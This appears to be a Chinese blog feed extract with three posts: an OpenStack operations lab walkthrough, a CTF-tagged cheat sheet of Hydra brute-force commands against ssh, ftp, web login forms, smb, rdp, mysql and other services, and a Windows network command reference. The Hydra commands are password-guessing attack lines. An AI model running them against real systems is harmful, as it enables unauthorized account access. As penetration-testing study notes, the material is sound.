id="创建项目："><a href="#创建项目：" class="headerlink" title="创建项目："></a>创建项目：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack project create yjs213 --domain demo</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/8.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack project list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/9.png"></p><h3 id="创建角色："><a href="#创建角色：" class="headerlink" title="创建角色："></a>创建角色：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role create yjs-user</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/10.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/11.png"></p><h3 id="绑定新用户和项目权限："><a href="#绑定新用户和项目权限：" class="headerlink" title="绑定新用户和项目权限："></a>绑定新用户和项目权限：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role add yjs-user --project yjs213 --user panjielun</span><br><span class="line">[root@controller-pjl ~]# openstack project list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/12.png"></p><h3 id="创建角色：-1"><a href="#创建角色：-1" class="headerlink" title="创建角色："></a>创建角色：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role create yjs-user</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/13.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/14.png"></p><h3 id="绑定新用户和项目权限：-1"><a href="#绑定新用户和项目权限：-1" class="headerlink" title="绑定新用户和项目权限："></a>绑定新用户和项目权限：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role add yjs-user --project yjs213 --user panjielun</span><br><span class="line">[root@controller-pjl ~]# openstack project list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/15.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack user list</span><br><span class="line">[root@controller-pjl ~]# openstack user show e39c9f5cf9e94e47b98a66ead117de20</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/16.png"><br><img src="/Openstack%E8%BF%90%E7%BB%B4/17.png"></p><h3 id="查看keystone的endpoint端点是否存在"><a href="#查看keystone的endpoint端点是否存在" class="headerlink" title="查看keystone的endpoint端点是否存在"></a>查看keystone的endpoint端点是否存在</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack endpoint list |grep keystone</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/18.png"></p><h3 id="查看5000和35357端口是否处于开放状态"><a href="#查看5000和35357端口是否处于开放状态" class="headerlink" title="查看5000和35357端口是否处于开放状态"></a>查看5000和35357端口是否处于开放状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# netstat -lnep |grep 5000</span><br><span class="line">[root@controller-pjl ~]# netstat -lnep |grep 35357</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/19.png"></p><h2 id="glance的基础运维"><a href="#glance的基础运维" class="headerlink" title="glance的基础运维"></a>glance的基础运维</h2><h3 id="创建cirros镜像"><a href="#创建cirros镜像" class="headerlink" title="创建cirros镜像"></a>创建cirros镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-create --name cirros --disk-format qcow2 --container-format bare --file /opt/images/CentOS_7.5_x86_64_XD.qcow2</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/20.png"></p><h3 id="查看镜像列表"><a href="#查看镜像列表" class="headerlink" title="查看镜像列表"></a>查看镜像列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/21.png"></p><h3 id="更改镜像名字"><a href="#更改镜像名字" class="headerlink" title="更改镜像名字"></a>更改镜像名字</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-update aac8f6ef-5b38-4219-91b1-fead46cb5030 --name panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/22.png"></p><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-delete aac8f6ef-5b38-4219-91b1-fead46cb5030</span><br><span class="line">[root@controller-pjl ~]# glance image-list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/23.png"></p><h2 id="nova的基础运维"><a href="#nova的基础运维" class="headerlink" title="nova的基础运维"></a>nova的基础运维</h2><h3 id="创建云主机类型mini-1VCPU-512M内存，5G硬盘-、查看云主机类型"><a href="#创建云主机类型mini-1VCPU-512M内存，5G硬盘-、查看云主机类型" class="headerlink" title="创建云主机类型mini(1VCPU,512M内存，5G硬盘)、查看云主机类型"></a>创建云主机类型mini(1VCPU,512M内存，5G硬盘)、查看云主机类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova flavor-create mini 22 512 5 1</span><br><span class="line">[root@controller-pjl ~]# nova flavor-list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/24.png"></p><h3 id="创建一虚拟机panjielun实例"><a href="#创建一虚拟机panjielun实例" class="headerlink" title="创建一虚拟机panjielun实例"></a>创建一虚拟机panjielun实例</h3><p>创一个稍微大一点的主机类型，2g运行内存，20g硬盘，1cpu，命名为small。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova flavor-create small 222 2048 20 1</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/25.png"><br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server create panjielun --image CentOS7.5 --network wl2 --flavor small</span><br></pre></td></tr></table></figure><br>其中panjielun为主机名，CentOS7.5为镜像名字，wl2，为内网地址的名字，small为主机类型<br> <img src="/Openstack%E8%BF%90%E7%BB%B4/26.png"></p><h3 id="启动实例"><a href="#启动实例" class="headerlink" title="启动实例"></a>启动实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/27.png"></p><h3 id="查看实例"><a href="#查看实例" class="headerlink" title="查看实例"></a>查看实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova show panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/28.png"></p><h3 id="使用-nova-service-list-查看服务的状态"><a href="#使用-nova-service-list-查看服务的状态" class="headerlink" title="使用 nova  service-list 查看服务的状态"></a>使用 nova  service-list 查看服务的状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova service-list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/29.png"></p><h3 id="使用nova-hypervisor-list-查看计算节点的主机列表"><a href="#使用nova-hypervisor-list-查看计算节点的主机列表" class="headerlink" title="使用nova hypervisor-list 查看计算节点的主机列表"></a>使用nova hypervisor-list 查看计算节点的主机列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova hypervisor-list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/30.png"></p><h2 id="neutron-基础运维"><a href="#neutron-基础运维" class="headerlink" title="neutron 基础运维"></a>neutron 基础运维</h2><h3 id="使用openstack-network-list命令查看所有网络"><a href="#使用openstack-network-list命令查看所有网络" class="headerlink" title="使用openstack network list命令查看所有网络"></a>使用openstack network list命令查看所有网络</h3><p>使用openstack port list命令查看所有端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack port list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/31.png"></p><h2 id="cinder-运维"><a href="#cinder-运维" class="headerlink" title="cinder 运维"></a>cinder 运维</h2><h3 id="创建云硬盘类型"><a href="#创建云硬盘类型" class="headerlink" title="创建云硬盘类型"></a>创建云硬盘类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# cinder type-create panjielun</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/32.png"><br>创建一个云硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# cinder create 10 --name panjielun --volume-type panjielun</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/33.png"><br>将一个云主机挂载该云硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server add volume panjielun panjielun</span><br><span class="line">[root@controller-pjl ~]# openstack server show panjielun</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/34.png"><br>查看是否挂载成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server show panjielun |grep volume</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/35.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# cinder list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/36.png"></p><h2 id="swift运维"><a href="#swift运维" class="headerlink" title="swift运维"></a>swift运维</h2><h3 id="创建容器、查询容器"><a href="#创建容器、查询容器" class="headerlink" title="创建容器、查询容器"></a>创建容器、查询容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift post panjielun</span><br><span class="line">[root@controller-pjl ~]# swift list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/37.png"></p><h3 id="上传文件之容器"><a href="#上传文件之容器" class="headerlink" title="上传文件之容器"></a>上传文件之容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift upload panjielun /opt/images/CentOS_7.5_x86_64_XD.qcow2</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/38.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift stat panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/39.png"></p><h3 id="从容器下载文件"><a href="#从容器下载文件" class="headerlink" title="从容器下载文件"></a>从容器下载文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift download panjielun opt/images/CentOS_7.5_x86_64_XD.qcow2 -o /root/CentOS_7.5_x86_64_XD.qcow2</span><br></pre></td></tr></table></figure><p>  <img src="/Openstack%E8%BF%90%E7%BB%B4/40.png"></p><h3 id="查看容器服务器的状态"><a href="#查看容器服务器的状态" class="headerlink" title="查看容器服务器的状态"></a>查看容器服务器的状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift stat panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/41.png"></p><h2 id="Heat运维"><a href="#Heat运维" class="headerlink" title="Heat运维"></a>Heat运维</h2><h3 id="查看云主机的类型列表"><a href="#查看云主机的类型列表" class="headerlink" title="查看云主机的类型列表"></a>查看云主机的类型列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack flavor list</span><br></pre></td></tr></table></figure><p>  <img src="/Openstack%E8%BF%90%E7%BB%B4/42.png"></p><h3 id="查看镜像列表-1"><a href="#查看镜像列表-1" class="headerlink" title="查看镜像列表"></a>查看镜像列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack image list</span><br></pre></td></tr></table></figure><p>  <img src="/Openstack%E8%BF%90%E7%BB%B4/43.png"></p><h3 id="查看网络列表"><a href="#查看网络列表" class="headerlink" title="查看网络列表"></a>查看网络列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack network list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/44.png"></p><h3 id="创建Heat模板文件demo-yaml"><a href="#创建Heat模板文件demo-yaml" class="headerlink" title="创建Heat模板文件demo.yaml"></a>创建Heat模板文件demo.yaml</h3><p>其中resouces.server 中使用的image，flavor为你自己环境中的某镜像和规格，通过上面查看的镜像列表和云主机类型列表里面进行选择<br> <img src="/Openstack%E8%BF%90%E7%BB%B4/45.png"></p><h3 id="网络的设置-，则通过export命令-，将内网的ID赋值给NET-ID变量"><a href="#网络的设置-，则通过export命令-，将内网的ID赋值给NET-ID变量" class="headerlink" title="网络的设置 ，则通过export命令 ，将内网的ID赋值给NET_ID变量"></a>网络的设置 ，则通过export命令 ，将内网的ID赋值给NET_ID变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export NET_ID=&lt;NETWORK_ID&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# export NET_ID=0ebc6516-353e-4bb4-acb9-25b4a42b0d8b</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/46.png"></p><h3 id="执行“创建堆栈”命令"><a href="#执行“创建堆栈”命令" class="headerlink" title="执行“创建堆栈”命令"></a>执行“创建堆栈”命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack stack create -t demo.yaml --parameter &quot;NetID=$NET_ID&quot; </span><br><span class="line">panjielun_demo</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/47.png"></p><h3 id="查看堆栈列表"><a href="#查看堆栈列表" class="headerlink" title="查看堆栈列表"></a>查看堆栈列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack stack list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/48.png"></p><h3 id="查看新创建堆栈详细信息"><a href="#查看新创建堆栈详细信息" class="headerlink" title="查看新创建堆栈详细信息"></a>查看新创建堆栈详细信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack stack show panjielun_demo</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/49.png"></p><h3 id="查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）"><a href="#查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）" class="headerlink" title="查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）"></a>查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/50.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;mysql基础运维&quot;&gt;&lt;a href=&quot;#mysql基础运维&quot; class=&quot;headerlink&quot; title=&quot;mysql基础运维&quot;&gt;&lt;/a&gt;mysql基础运维&lt;/h2&gt;&lt;h3 id=&quot;查看数据库服务是否处于active状态&quot;&gt;&lt;a href=&quot;#查看数据库服</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Hydra常用爆破语句</title>
    <link href="https://jielunya.github.io/2022/12/02/Hydra%E5%B8%B8%E7%94%A8%E7%88%86%E7%A0%B4%E8%AF%AD%E5%8F%A5/"/>
    <id>https://jielunya.github.io/2022/12/02/Hydra%E5%B8%B8%E7%94%A8%E7%88%86%E7%A0%B4%E8%AF%AD%E5%8F%A5/</id>
    <published>2022-12-02T04:46:28.616Z</published>
    <updated>2022-12-02T05:00:53.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="破解ssh："><a href="#破解ssh：" class="headerlink" title="破解ssh："></a>破解ssh：</h2><p>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e ns ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh </p><h2 id="破解ftp："><a href="#破解ftp：" class="headerlink" title="破解ftp："></a>破解ftp：</h2><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV </p><h2 id="get方式提交，破解web登录："><a href="#get方式提交，破解web登录：" class="headerlink" title="get方式提交，破解web登录："></a>get方式提交，破解web登录：</h2><p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get &#x2F;admin&#x2F;<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php</p><h2 id="post方式提交，破解web登录："><a href="#post方式提交，破解web登录：" class="headerlink" title="post方式提交，破解web登录："></a>post方式提交，破解web登录：</h2><p>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “&#x2F;admin&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;submit&#x3D;login:sorry password”<br>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id&#x3D;^USER^&amp;passwd&#x3D;^PASS^:<title>wrong username or password</title>“<br>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） </p><h2 id="破解https："><a href="#破解https：" class="headerlink" title="破解https："></a>破解https：</h2><p>hydra -m &#x2F;index.php -l muts -P pass.txt 10.36.16.18 https </p><h2 id="破解teamspeak："><a href="#破解teamspeak：" class="headerlink" title="破解teamspeak："></a>破解teamspeak：</h2><p>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak </p><h2 id="破解cisco："><a href="#破解cisco：" class="headerlink" title="破解cisco："></a>破解cisco：</h2><p>hydra -P pass.txt 10.36.16.18 cisco<br>hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable </p><h2 id="破解smb："><a href="#破解smb：" class="headerlink" title="破解smb："></a>破解smb：</h2><p>hydra -l administrator -P pass.txt 10.36.16.18 smb </p><h2 id="破解pop3："><a href="#破解pop3：" class="headerlink" title="破解pop3："></a>破解pop3：</h2><p>hydra -l muts -P pass.txt my.pop3.mail pop3 </p><h2 id="破解rdp："><a href="#破解rdp：" class="headerlink" title="破解rdp："></a>破解rdp：</h2><p>hydra ip rdp -l administrator -P pass.txt -V </p><h2 id="破解http-proxy："><a href="#破解http-proxy：" class="headerlink" title="破解http-proxy："></a>破解http-proxy：</h2><p>hydra -l admin -P pass.txt http-proxy:&#x2F;&#x2F;10.36.16.18 </p><h2 id="破解imap："><a href="#破解imap：" class="headerlink" title="破解imap："></a>破解imap：</h2><p>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN<br>hydra -C defaults.txt -6 imap:&#x2F;&#x2F;[fe80::2c:31ff:fe12:ac11]:143&#x2F;PLAIN</p><h2 id="爆破mysql："><a href="#爆破mysql：" class="headerlink" title="爆破mysql："></a>爆破mysql：</h2><p>hydra -L .&#x2F;user.txt -P .&#x2F;password.txt -t 2 -e n -f -v 192.168.43.17 mysql<br>mysql远程连接：mysql -h ip -u root -p</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;破解ssh：&quot;&gt;&lt;a href=&quot;#破解ssh：&quot; class=&quot;headerlink&quot; title=&quot;破解ssh：&quot;&gt;&lt;/a&gt;破解ssh：&lt;/h2&gt;&lt;p&gt;hydra -l 用户名 -P 密码字典 -t 线程 -vV -e ns ip ssh&lt;br&gt;hydra -</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows网络命令</title>
    <link href="https://jielunya.github.io/2022/12/02/Windows%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/"/>
    <id>https://jielunya.github.io/2022/12/02/Windows%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/</id>
    <published>2022-12-02T04:29:48.675Z</published>
    <updated>2022-12-02T05:00:52.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows网络命令"><a href="#Windows网络命令" class="headerlink" title="Windows网络命令"></a>Windows网络命令</h2><p>开始——运行——CMD——提示符后面输入命令。上下箭头键的使用，上下箭头键，调出已经输入的命令。<br>  1.Windows常用网络命令</p><h3 id="ipconfig命令：IP配置查看命令"><a href="#ipconfig命令：IP配置查看命令" class="headerlink" title="ipconfig命令：IP配置查看命令"></a>ipconfig命令：IP配置查看命令</h3><p>显示IP协议（IP地址、子网掩码、网关）的配置信息<br>  ipconfig&#x2F;?<br>  ipconfig&#x2F;all&#x2F;&#x2F;显示详细的配置信息（物理地址）<br>DHCP，自动获取IP地址：<br>  ipconfig&#x2F;release&#x2F;&#x2F;释放IP地址<br>  ipconfig&#x2F;renew&#x2F;&#x2F;重新获取IP地址<br>  ipconfig&#x2F;flushdns&#x2F;&#x2F;清除DNS解析缓存</p><h3 id="ping命令：测试目的地址是否连通"><a href="#ping命令：测试目的地址是否连通" class="headerlink" title="ping命令：测试目的地址是否连通"></a>ping命令：测试目的地址是否连通</h3><p>格式：ping 参数 IP地址或名称<br>参数：<br>  -l 设置数据包大小 32—65500，默认32字节<br>  -n 自定义数据包个数，默认4<br>  -t 一直ping直到人为中断（CTRL+C）<br>  -a 显示计算机名<br>网络诊断步骤：<br>① ping 127.0.0.1（环回地址）<br>  ping不通，TCP&#x2F;IP协议存在问题。<br>② ping 本机IP地址<br>  ping不通，本地配置（连接）或网卡安装存在问题。<br>③ ping 本网内其它IP地址<br>  ping不通，本地网卡和线路存在问题。<br>④ ping 网关IP地址<br>  ping不通，网关存在问题。<br>⑤ ping 公网地址（61.177.238.201）<br>  ping不通，不能连入公网。<br>⑥ ping 域名（<a href="http://www.baidu.com)/">www.baidu.com）</a><br>  ping不通，DNS配置存在问题。</p><h3 id="netstat命令：查看相关协议统计信息和网络连接情况"><a href="#netstat命令：查看相关协议统计信息和网络连接情况" class="headerlink" title="netstat命令：查看相关协议统计信息和网络连接情况"></a>netstat命令：查看相关协议统计信息和网络连接情况</h3><p>（检测网络连接）<br>  netstat -s -e&#x2F;&#x2F;查看相关协议统计信息<br>  netstat -a -n&#x2F;&#x2F;查看网络连接情况</p><h3 id="tracert命令：查看数据包达到目标主机所经过的路径"><a href="#tracert命令：查看数据包达到目标主机所经过的路径" class="headerlink" title="tracert命令：查看数据包达到目标主机所经过的路径"></a>tracert命令：查看数据包达到目标主机所经过的路径</h3><h3 id="arp-命令：查看修改地址解析协议（ip地址——MAC地址）"><a href="#arp-命令：查看修改地址解析协议（ip地址——MAC地址）" class="headerlink" title="arp 命令：查看修改地址解析协议（ip地址——MAC地址）"></a>arp 命令：查看修改地址解析协议（ip地址——MAC地址）</h3><p>  -a 查看<br>  -s 静态绑定ip地址和MAC地址<br>  -d 删除</p><h3 id="nslookup命令"><a href="#nslookup命令" class="headerlink" title="nslookup命令"></a>nslookup命令</h3><p>nslookup命令：DNS域名解析工具</p><h3 id="nbtstat命令"><a href="#nbtstat命令" class="headerlink" title="nbtstat命令"></a>nbtstat命令</h3><p>nbtstat命令：使用TCP&#x2F;IP上的NetBIOS显示协议统计和当前TCP&#x2F;IP连接，可以得到远程主机的NETBIOS信息，如用户名、所属工作组，网卡的MAC地址等<br>参数：<br>  -a 通过远程主机的机器名得到NETBIOS信息<br>  -A 通过远程主机的IP地址得到NETBIOS信息<br>  -n 列出本地主机的NETBIOS信息</p><h2 id="Windows中net命令集"><a href="#Windows中net命令集" class="headerlink" title="Windows中net命令集"></a>Windows中net命令集</h2><p>   net help 子命令<br>   net 子命令 &#x2F;?</p><h3 id="Net-User-本地用户帐号操作"><a href="#Net-User-本地用户帐号操作" class="headerlink" title="Net User  本地用户帐号操作"></a>Net User  本地用户帐号操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：Net user [username [password | *] [options]] [/domain]</span><br></pre></td></tr></table></figure><p>  net user&#x2F;&#x2F;查看所有用户<br>  net user zhangsan bg888 &#x2F;add&#x2F;&#x2F;添加用户zhangsan密码bg888，默认users用户组<br>  net user zhangsan&#x2F;&#x2F;查看用户zhangsan的具体信息<br>  net user zhangsan &#x2F;active:no&#x2F;&#x2F;禁用用户帐户<br>  net user zhangsan &#x2F;active:yes&#x2F;&#x2F;启用用户帐户<br>  net user zhangsan &#x2F;delete&#x2F;&#x2F;删除用户zhang3</p><h3 id="Net-Localgroup-本地用户组操作"><a href="#Net-Localgroup-本地用户组操作" class="headerlink" title="Net Localgroup  本地用户组操作"></a>Net Localgroup  本地用户组操作</h3><p>格式：Net localgroup groupname {&#x2F;add [&#x2F;comment:”text “] | &#x2F;delete} [&#x2F;domain]<br>  net localgroup              &#x2F;&#x2F;查看所有组<br>  net localgroup administrators   &#x2F;&#x2F;查看组administrators的具体信息<br>  net localgroup teacher &#x2F;add   &#x2F;&#x2F;添加组teacher<br>  net localgroup home1 &#x2F;delete    &#x2F;&#x2F;删除组home1<br>  net localgroup teacher zhangsan &#x2F;add  &#x2F;&#x2F;将用户zhangsan加入到组teacher</p><h3 id="Net-Share-共享资源操作"><a href="#Net-Share-共享资源操作" class="headerlink" title="Net Share  共享资源操作"></a>Net Share  共享资源操作</h3><p>格式：Net share sharename&#x3D;drive:path [&#x2F;users:number | &#x2F;unlimited] [&#x2F;remark:”text”]<br>·sharename是共享资源的网络名称<br>·drive:path指定共享目录的绝对路径<br>·&#x2F;users:number设置可同时访问共享资源的最大用户数<br>·&#x2F;unlimited不限制同时访问共享资源的用户数<br>·&#x2F;remark:”text “添加关于资源的注释，注释文字用引号引住<br>  net share           &#x2F;&#x2F;显示计算机上所有共享资源<br>  net share myshare&#x3D;c:\fhsh01 &#x2F;&#x2F;共享名myshare，共享路径c:\fhsh01<br>  net share mysh02&#x3D;c:\fhsh02 &#x2F;users:10<br>  net share yesky&#x3D;c:\temp &#x2F;remark:”my first share”<br>  &#x2F;&#x2F;以yesky为共享名共享C:\temp<br>　net share mysh02 &#x2F;delete   &#x2F;&#x2F;停止共享mysh02</p><h3 id="Net-View-显示计算机列表或指定计算机的共享资源"><a href="#Net-View-显示计算机列表或指定计算机的共享资源" class="headerlink" title="Net View  显示计算机列表或指定计算机的共享资源"></a>Net View  显示计算机列表或指定计算机的共享资源</h3><p>格式：Net view [\computername | &#x2F;domain[:domainname]]<br>·\computername指定要查看其共享资源的计算机<br>·&#x2F;domain[:domainname]指定要查看其可用计算机的域<br>  net view            &#x2F;&#x2F;显示当前域的计算机列表<br>  net view &#x2F;domain:XYZ    &#x2F;&#x2F;显示XYZ域中的计算机列表<br>　net view \GHQ       &#x2F;&#x2F;查看GHQ计算机的共享资源<br>　net view \192.168.8.201</p><h3 id="Net-Use-连接计算机共享资源，或显示连接信息"><a href="#Net-Use-连接计算机共享资源，或显示连接信息" class="headerlink" title="Net Use  连接计算机共享资源，或显示连接信息"></a>Net Use  连接计算机共享资源，或显示连接信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：Net use [devicename | *] [\\computername\sharename[\volume]] [password|*]][/user:[domainname\]username][[/delete]| [/persistent:&#123;yes | no&#125;]]</span><br></pre></td></tr></table></figure><p>·键入不带参数的Net use列出网络连接<br>·devicename指定要连接到的资源名称或要断开的设备名称<br>·\computername\sharename服务器及共享资源的名称<br>·password访问共享资源的密码<br>·*提示键入密码<br>·&#x2F;user指定进行连接的另外一个用户<br>·domainname指定另一个域<br>·username指定登录的用户名<br>·&#x2F;home将用户连接到其宿主目录<br>·&#x2F;delete取消指定网络连接<br>·&#x2F;persistent控制永久网络连接的使用<br>  net use f: \gho\temp &#x2F;&#x2F;将\gho\temp共享目录映射为F盘<br>  net use g: \192.168.8.201\myshare<br>  net use f: &#x2F;delete    &#x2F;&#x2F;断开连接</p><h3 id="Net-Time-使计算机时钟与另一台计算机或域的时间同步"><a href="#Net-Time-使计算机时钟与另一台计算机或域的时间同步" class="headerlink" title="Net Time  使计算机时钟与另一台计算机或域的时间同步"></a>Net Time  使计算机时钟与另一台计算机或域的时间同步</h3><p>格式：Net time [\computername | &#x2F;domain[:name]] 